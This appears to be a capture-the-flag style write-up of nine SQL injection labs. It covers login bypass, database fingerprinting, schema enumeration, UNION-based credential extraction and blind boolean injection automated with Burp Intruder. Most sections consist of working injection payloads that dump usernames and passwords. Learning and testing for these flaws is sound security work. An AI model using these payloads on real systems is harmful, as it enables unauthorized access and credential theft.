# SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data

## Lab Description
![image](Picture/lab1.png)

In this lab, we are dealing with a SQL injection vulnerability in the `WHERE` clause of a query. The application uses the following SQL query to retrieve products from the database:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

This query selects products from the `products` table where the `category` is `Gifts` and the `released` status is `1`, indicating that the products are available to the public.

### Exploiting the Vulnerability

To exploit this vulnerability and view all products, including unreleased ones, we can manipulate the query by making the `WHERE` condition always true:

```sql
Gifts' OR 1=1--
```

Here’s what happens:
- The condition `1=1` is always true.
- The `--` operator starts a comment in SQL, which effectively ignores the rest of the original query. This allows us to bypass the `released = 1` condition and retrieve all products.

# SQL Injection Vulnerability Allowing Login Bypass

## Lab Description
![image](Picture/lab2.png)

In this lab, the application uses a SQL query to authenticate users. The query might look something like this:

```sql
SELECT * FROM users WHERE username = 'username' AND password = 'password';
```

### Exploiting the Vulnerability

To bypass the login mechanism, we can inject SQL code directly into the `username` field:

```sql
WHERE username = 'administrator' --
```

This transforms the query into:

```sql
SELECT * FROM users WHERE username = 'administrator' -- ' AND password = '<PASSWORD>'
```

- The `--` operator comments out the password check, allowing us to bypass authentication and log in as the `administrator`.

# SQL Injection Attack: Querying the Database Type and Version on Oracle

## Lab Description
![image](Picture/lab3.png)

When working with Oracle databases, every `SELECT` statement must specify a table to select `FROM`. Oracle provides a special table called `dual` for such purposes.

### Steps to Extract Database Version

To determine the database version, we can use the following methods:
- Query the `v$version` view: `SELECT banner FROM v$version`
- Query the `v$instance` view: `SELECT version FROM v$instance`

#### Step-by-Step Exploitation

1. **Identify the Number of Columns:**
   Inject an `ORDER BY` clause to identify how many columns are in the original query:
   ```sql
   SELECT * FROM someTable WHERE category = 'any' ORDER BY 2--
   ```
   Keep increasing the number until you receive an error, indicating the total number of columns.

2. **Determine String Columns:**
   Use a `UNION` query to find which columns accept string data:
   ```sql
   SELECT * FROM someTable WHERE category = 'any' UNION SELECT 'a','a' FROM DUAL--
   ```

3. **Extract Version Information:**
   Finally, inject a `UNION` query to retrieve the version information:
   ```sql
   SELECT * FROM someTable WHERE category='any' UNION SELECT 'a', banner FROM v$version--
   ```

# SQL Injection Attack: Querying the Database Type and Version on MySQL and Microsoft

## Lab Description
![image](Picture/lab4.png)

This lab is similar to the previous one, but with a focus on MySQL and Microsoft databases.

### Key Differences

- In MySQL, comments start with `#`.
- To query the database version in MySQL or Microsoft SQL Server, use `SELECT @@version`.

#### Step-by-Step Exploitation

1. **Inject the Payload:**
   ```sql
   SELECT * FROM someTable WHERE category='any' UNION SELECT 'a', @@version#'
   ```

This will reveal the database version.

# SQL Injection Attack: Listing the Database Contents on Oracle

## Lab Description
![image](Picture/lab5.png)

This lab involves an Oracle database, where all table information is stored in the `ALL_TABLES` view.

### Exploiting the Vulnerability

1. **Identify Available Tables:**
   Inject a `UNION` query to list table names:
   ```sql
   SELECT * FROM someTable WHERE category='any' UNION SELECT table_name, NULL FROM all_tables--
   ```
   In this case, the `USERS_XJIAWY` table was found.

2. **Identify Column Names:**
   Next, query the `ALL_TAB_COLUMNS` view to identify columns in the `USERS_XJIAWY` table:
   ```sql
   SELECT * FROM someTable WHERE category='any' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_XJIAWY'--
   ```
   This reveals columns like `USERNAME_HDFLSL` and `PASSWORD_VASGBS`.

3. **Extract Data:**
   Finally, retrieve the usernames and passwords:
   ```sql
   SELECT * FROM someTable WHERE category='any' UNION SELECT USERNAME_HDFLSL, PASSWORD_VASGBS FROM USERS_XJIAWY--
   ```
   The password for the `administrator` is discovered.

# SQL Injection Attack: Listing the Database Contents on Non-Oracle Databases

## Lab Description
![image](Picture/lab6.png)

In this lab, the database is using PostgreSQL, which stores table information in the `information_schema.tables` view.

### Exploiting the Vulnerability

1. **Identify Available Tables:**
   Inject a `UNION` query to list table names:
   ```sql
   SELECT * FROM someTable WHERE category='any' UNION SELECT table_name, NULL FROM information_schema.tables--
   ```
   This reveals a table named `users_xaurai`.

2. **Identify Column Names:**
   Next, query the `information_schema.columns` view to identify columns in the `users_xaurai` table:
   ```sql
   SELECT * FROM someTable WHERE category='any' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xaurai'--
   ```
   This reveals columns like `username_huyzfv` and `password_mxlnvz`.

3. **Extract Data:**
   Finally, retrieve the usernames and passwords:
   ```sql
   SELECT * FROM someTable WHERE category='any' UNION SELECT username_huyzfv, password_mxlnvz FROM users_xaurai--
   ```
   The password for the `administrator` is discovered.

# SQL Injection UNION Attack: Retrieving Data from Other Tables

## Lab Description
![image](Picture/lab7.png)

We know that the database contains a table named `users`, with columns `username` and `password`.

### Exploiting the Vulnerability

Inject a `UNION` query to retrieve usernames and passwords:

```sql
SELECT * FROM someTable WHERE category='any' UNION SELECT username, password FROM users--
```

The password for the `administrator` is revealed, allowing you to log in and solve the lab.

# SQL Injection UNION Attack: Retrieving Multiple Values in a Single Column

## Lab Description
![image](Picture/lab8.png)

To retrieve multiple values in a single column, use the `||` string concatenation operator in Oracle.

### Exploiting the Vulnerability

Inject a `UNION` query to concatenate the username and password:

```sql
SELECT * FROM someTable WHERE category='any' UNION SELECT null, username || '~' || password FROM users--
```

This reveals the password for the `administrator`.

# Blind SQL Injection with Conditional Responses

## Lab Description
![image](Picture/lab9.png)

In this lab, we will exploit a blind SQL injection vulnerability by using conditional responses to extract information. The page displays "Welcome back" when the query returns any rows.

### Step 1: Confirming the Injection Point

We can test this by injecting a condition that is always true:

```sql
SELECT TrackingId FROM someTable WHERE TrackingId = 'xyz' AND 1=1--
```

If the page shows "Welcome back," the injection point is confirmed.

### Step 2: Determining the Password Length

Next, we determine the length of the administrator's password by incrementally increasing the length in our query until the "Welcome back" message disappears:

```sql
SELECT TrackingId FROM someTable WHERE TrackingId = 'xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'--
```

This query reveals that the password is 20 characters long.

### Step 3: Extracting the Password

Once the length is known, we can brute-force each character individually using a substring function:

```sql
SELECT TrackingId FROM someTable WHERE TrackingId = 'xyz' AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a'--
```

Use Burp Intruder to automate the brute-force process:

Add payload marker in like that.

![image](Picture/blindsql1.png)

1. **Payload 1:** Numbers from 1 to 20.
2. **Payload 2:** Use Brute force with max, min = 1.
3. **Grep:** Look for the "Welcome back" message.

This reveals the password, allowing you to log in and solve the lab.

![image](Picture/blindsql2.png)

---
